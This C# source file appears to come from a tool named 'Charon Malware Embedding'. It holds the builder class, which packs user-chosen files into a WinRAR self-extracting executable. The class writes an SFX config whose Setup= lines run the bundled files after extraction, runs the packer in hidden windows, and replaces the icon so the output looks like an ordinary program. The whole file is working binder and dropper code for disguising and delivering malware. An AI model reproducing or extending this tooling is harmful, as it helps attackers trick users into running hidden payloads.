using System;
using System.Collections.Generic;
using System.Diagnostics;
using System.IO;
using System.Linq;
using System.Text;
using System.Threading;
using System.Windows.Forms;

namespace Charon_Malware_Embedding.Tools
{
    class Builder
    {

        public static ProgressBuilding ProgressedForm = new ProgressBuilding();
        public static MainWindow WindowsDefaultForm = new MainWindow();
        public static void ShowProgressForm()
        {
            ProgressedForm.Show(WindowsDefaultForm);
        }
        public static void SetProgressValue(int value)
        {
            if (ProgressedForm != null)
            {
                ProgressedForm.ProgressGenerating.Value = value;
            }
        }
        public static void SetLabelValue(string message)
        {
            if (ProgressedForm != null)
            {
                ProgressedForm.label1.Text = message;
            }
        }

        public static void CloseProgressForm()
        {
            ProgressedForm.Close();
        }

        /// <summary>
        /// This Function Generates EXE Files from the provided files in ListView.
        /// </summary>
        /// <param name="configPath">Config path for creating EXE files.</param>
        /// <param name="module">Module (32bit or 64bit) for the EXE file.</param>
        /// <param name="icon">Icon path for the EXE file.</param
        /// <param name="filesName">Path Of Files In Function Get BaseName</param>
        /// <param name="filesPath">Path of Files For EXE</param>
        /// <param name="IconPaths">Path Of Icon EXE File</param>
        /// <param name="output">Output Name Of File</param>
        /// <param name="PathExtract">Extracting Path</param>
        public static void Generate(string output, string configPath, string module, string filesPath, string filesName, string PathExtract, string IconPaths = null)
        {
            if (Tools.Utils.IsStringEmpty(output))
            {
                MessageBox.Show("Please select output file.", "ERROR OUTPUT SELECTING", MessageBoxButtons.OK, MessageBoxIcon.Error);
                return;
            }

            if (File.Exists(Config.TempEXEFile))
            {
                File.Delete(Config.TempEXEFile);
            }
            CopyResources();

            if (configPath == null)
            {
                Tools.NotificationCreator.NotificationCreator_ERROR("ERROR", "Somthing IS Wrong", 2000);
                return;
            }
            else if (module == null)
            {
                Tools.NotificationCreator.NotificationCreator_ERROR("ERROR", "Somthing IS Wrong", 2000);
                return;
            }
            else if (filesPath == null)
            {
                Tools.NotificationCreator.NotificationCreator_ERROR("ERROR ADDING FILES", "Files list is empty. Please add files", 2000);
                return;
            }
            else if (PathExtract == null)
            {
                Tools.NotificationCreator.NotificationCreator_ERROR("ERROR", "Somthing IS Wrong", 2000);
                return;
            }

            else
            {
                NotificationCreator.NotificationCreator_INFO("Charon Malware Embedding", "Wait For The Files To Embed ...", 2000);
                ShowProgressForm();
                SetLabelValue("Checking Files");
                SetProgressValue(20);

                Thread.Sleep(3000);
                string[] Arguments = { "a", "-sfx", $"-z\"{Config.ConfigTemplate}\"", Config.TempEXEFile};

                Arguments = Utils.AppendToArray(Arguments, filesPath);

                string[] Files_Name_Config = filesName.Split(' ');
                Utils.ConfigFilePathExtractFiles(PathExtract);
                Utils.WriteToFile(Config.ConfigTemplate, Config.DroppedFileIn);
                Utils.AppendToFile(Config.ConfigTemplate, Config.ConfigContent);
                SetLabelValue("Generating Config File");
                SetProgressValue(35);
                Thread.Sleep(2000);

                foreach (var NotSortedFile in Files_Name_Config)
                {
                    string SetupAfterExtractionFile = $"Setup={Path.GetFileName(NotSortedFile)}";
                    Utils.AppendToFile(Config.ConfigTemplate, SetupAfterExtractionFile);
                }

                SetLabelValue("Embedding Files");

                string ARGS = string.Join(" ", Arguments);

                Process process = new Process
                {
                    StartInfo = new ProcessStartInfo
                    {
                        FileName = Config.BuilderR,
                        Arguments = ARGS,
                        UseShellExecute = true,
                        CreateNoWindow = true,
                        WindowStyle = ProcessWindowStyle.Hidden
                    }
                };
                process.Start();
                process.WaitForExit();
                SetLabelValue("Embedding Files Completed Successfully");
                SetProgressValue(60);
                Thread.Sleep(2000);
                int ReturnCode = process.ExitCode;
                SetLabelValue("Checking For Icon");
                SetProgressValue(65);



                if (ReturnCode == 0)
                {
                    if (IconPaths == null)
                    {
                        SetLabelValue("Icon File Not Found (Default Icon)");
                        SetProgressValue(75);
                        string ARGS_BUILDER_withoutICON = $"-open {Config.TempEXEFile} -save {output} -action delete -mask ICONGROUP";
                        Process processBuildWithoutIcon = new Process
                        {
                            StartInfo = new ProcessStartInfo
                            {
                                FileName = Config.BuilderB,
                                Arguments = ARGS_BUILDER_withoutICON,
                                UseShellExecute = true,
                                CreateNoWindow = true,
                                WindowStyle = ProcessWindowStyle.Hidden
                            }
                        };
                        processBuildWithoutIcon.Start();
                        processBuildWithoutIcon.WaitForExit();
                        SetLabelValue("All Process Completed Successfully.");
                        SetProgressValue(100);
                        Thread.Sleep(2000);
                        CloseProgressForm();
                    }
                    else
                    {
                        string ARGS_BUILDER_withICON = $"-open {Config.TempEXEFile} -save {output} -action addoverwrite -res \"{Path.GetFullPath(IconPaths)}\" -mask ICONGROUP,MAINICON";
                        Process processBuildWithIcon = new Process
                        {
                            StartInfo = new ProcessStartInfo
                            {
                                FileName = Config.BuilderB,
                                Arguments = ARGS_BUILDER_withICON,
                                UseShellExecute = true,
                                CreateNoWindow = true,
                                WindowStyle = ProcessWindowStyle.Hidden
                            }
                        };
                        processBuildWithIcon.Start();
                        processBuildWithIcon.WaitForExit();
                        SetLabelValue("All Process Completed Successfully.");
                        SetProgressValue(100);
                        Thread.Sleep(2000);
                        CloseProgressForm();
                    }

                    NotificationCreator.NotificationCreator_INFO("Charon Malware Embedding", $"Your Files Embeded Successfully.\nMD5: {Utils.CalculateMD5(output)}", 2000);

                }

            }

        }






        public static void CopyResources()
        {
            var filesList = new List<Tools.Fileinformation>
            {
                new Tools.Fileinformation("Rar"),
                new Tools.Fileinformation("RarExt"),
                new Tools.Fileinformation("RarExt32"),
                new Tools.Fileinformation("Zip"),
                new Tools.Fileinformation("Zip32"),
                new Tools.Fileinformation("Default"),
                new Tools.Fileinformation("Default32"),
                new Tools.Fileinformation("Builder")
            };

            var fileBaseNameList = new List<Tools.BaseName>
            {
                new Tools.BaseName("Rar.exe"),
                new Tools.BaseName("RarExt.dll"),
                new Tools.BaseName("RarExt32.dll"),
                new Tools.BaseName("Zip.SFX"),
                new Tools.BaseName("Zip32.SFX"),
                new Tools.BaseName("Default.SFX"),
                new Tools.BaseName("Default32.SFX"),
                new Tools.BaseName("Builder.exe")
            };

            if (filesList.Count != fileBaseNameList.Count)
            {
                throw new InvalidOperationException("FilesList and FileBaseNameList must have the same number of elements.");
            }

            for (int i = 0; i < filesList.Count; i++)
            {
                Utils.CopyFilesList(filesList[i], fileBaseNameList[i]);
            }

        }
    }
}
